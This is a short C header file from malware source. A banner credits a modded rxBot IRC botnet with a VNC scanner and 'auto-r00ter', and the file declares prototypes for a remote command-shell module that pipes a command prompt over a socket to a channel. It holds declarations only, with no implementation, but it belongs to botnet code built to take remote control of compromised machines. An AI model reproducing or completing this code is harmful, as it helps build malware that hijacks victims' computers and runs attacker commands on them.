/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_REMOTECMD
void Close_Handles(void);
BOOL send_commands(char *commands);
DWORD WINAPI PipeReadThread(LPVOID param);
int pipe_send(SOCKET sock,char *chan, char *buf);
int open_cmd(SOCKET sock,char * chan);
DWORD WINAPI PipeReadThread(LPVOID param);
#endif